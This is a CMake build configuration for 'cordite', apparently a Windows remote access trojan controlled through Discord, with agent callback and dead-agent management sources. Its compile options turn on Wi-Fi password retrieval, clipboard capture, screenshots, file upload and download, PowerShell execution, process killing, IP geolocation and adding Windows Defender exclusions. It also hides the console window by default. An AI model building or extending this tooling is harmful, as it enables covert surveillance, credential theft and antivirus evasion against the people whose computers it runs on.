cmake_minimum_required(VERSION 3.10)
project(cordite CXX)

# Set C++ standard to 17
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Output directory for the executable (directly in build directory)
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${CMAKE_BINARY_DIR}")
# Explicitly set configuration-specific output directories to avoid subdirectories
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_DEBUG "${CMAKE_BINARY_DIR}")
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_RELEASE "${CMAKE_BINARY_DIR}")

# Collect all source files
set(SOURCES
    main.cpp
    src/core/DiscordClient.cpp
    src/core/HttpClient.cpp
    src/core/WebSocketClient.cpp
    src/core/Config.cpp
    src/core/EventHandler.cpp
    src/core/CommandRegister.cpp
    src/core/InitializationStatus.cpp
    src/commands/CmdUtils.cpp
    src/commands/CommandHandler.cpp
    src/commands/FileUtils.cpp
    src/commands/Screenshot.cpp
    src/commands/wifiProfiles.cpp
    src/commands/Clipboard.cpp
    src/commands/applications.cpp
    src/commands/sysinfo.cpp
    src/commands/ProcessList.cpp
    src/commands/DefenderExclusion.cpp
    src/commands/Location.cpp
    src/agents/Callback.cpp
    src/agents/Callback_Utils.cpp
    src/agents/Dead_Agent_Manager.cpp
)

# Define the executable
add_executable(cordite ${SOURCES})

# Include directories
target_include_directories(cordite PRIVATE
    "${CMAKE_SOURCE_DIR}/include"
    "${CMAKE_SOURCE_DIR}/./"
)

# Link libraries (adjust based on dependencies)
target_link_libraries(cordite PRIVATE
    kernel32.lib
    user32.lib
    ws2_32.lib  # For WebSocket
    # Add d3d11.lib, gdiplus.lib if needed for screenshot
)

# Option to enable debug mode (console visible)
option(DEBUG_MODE "Enable debug mode with console" OFF)
if(DEBUG_MODE)
    target_compile_definitions(cordite PRIVATE DEBUG_MODE)
    set_target_properties(cordite PROPERTIES LINK_FLAGS "/SUBSYSTEM:CONSOLE")
else()
    set_target_properties(cordite PROPERTIES LINK_FLAGS "/SUBSYSTEM:WINDOWS")
endif()

# Preprocessor definitions (no debug symbols, like Release mode)
target_compile_definitions(cordite PRIVATE
    NDEBUG
    _UNICODE
    UNICODE
)

# Option to enable screenshot functionality
option(ENABLE_SCREENSHOT "Enable screenshot functionality" OFF)
if(ENABLE_SCREENSHOT)
    target_compile_definitions(cordite PRIVATE ENABLE_SCREENSHOT)
endif()

# Option to enable download functionality
option(ENABLE_DOWNLOAD "Enable download functionality" OFF)
if(ENABLE_DOWNLOAD)
    target_compile_definitions(cordite PRIVATE ENABLE_DOWNLOAD)
endif()

# Option to enable upload functionality
option(ENABLE_UPLOAD "Enable upload functionality" OFF)
if(ENABLE_UPLOAD)
    target_compile_definitions(cordite PRIVATE ENABLE_UPLOAD)
endif()

option(ENABLE_WIFI "Enable wifi password retrieval functionality" OFF)
if(ENABLE_WIFI)
    target_compile_definitions(cordite PRIVATE ENABLE_WIFI)
endif()

option(ENABLE_CLIPBOARD "Retrieve clipboard contents from a specific agent" OFF)
if(ENABLE_CLIPBOARD)
    target_compile_definitions(cordite PRIVATE ENABLE_CLIPBOARD)
endif()

option(ENABLE_APPLICATIONS "Retrieve list of installed applications from a specific agent" OFF)
if(ENABLE_APPLICATIONS)
    target_compile_definitions(cordite PRIVATE ENABLE_APPLICATIONS)
endif()

option(ENABLE_SYSINFO "Retrieve system information from a specific agent" OFF)
if(ENABLE_SYSINFO)
    target_compile_definitions(cordite PRIVATE ENABLE_SYSINFO)
endif()

option(ENABLE_PROCESSES "Get all or a few running processes" OFF)
if(ENABLE_PROCESSES)
    target_compile_definitions(cordite PRIVATE ENABLE_PROCESSES)
endif()

option(ENABLE_REREGISTER "Re-register all commands" OFF)
if(ENABLE_REREGISTER)
    target_compile_definitions(cordite PRIVATE ENABLE_REREGISTER)
endif()

option(ENABLE_CLEANDEAD "Clean dead agents" OFF)
if(ENABLE_CLEANDEAD)
    target_compile_definitions(cordite PRIVATE ENABLE_CLEANDEAD)
endif()

option(ENABLE_DEFENDER_EXCLUSION "add defender exclusion zones" OFF)
if(ENABLE_DEFENDER_EXCLUSION)
    target_compile_definitions(cordite PRIVATE ENABLE_DEFENDER_EXCLUSION)
endif()

option(ENABLE_POWERSHELL "run powershell commands" OFF)
if(ENABLE_POWERSHELL)
    target_compile_definitions(cordite PRIVATE ENABLE_POWERSHELL)
endif()

option(ENABLE_KILL "kill any process running" OFF)
if(ENABLE_KILL)
    target_compile_definitions(cordite PRIVATE ENABLE_KILL)
endif()

option(ENABLE_LOCATION "get location by ip" OFF)
if(ENABLE_LOCATION)
    target_compile_definitions(cordite PRIVATE ENABLE_LOCATION)
endif()

option(ENABLE_CD_DIR "Enable cd and dir commands" OFF)
if(ENABLE_CD_DIR)
    target_compile_definitions(cordite PRIVATE ENABLE_CD_DIR)
endif()

# Set Release-specific flags (optional, ensures optimization)
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    target_compile_options(cordite PRIVATE /O2)
endif()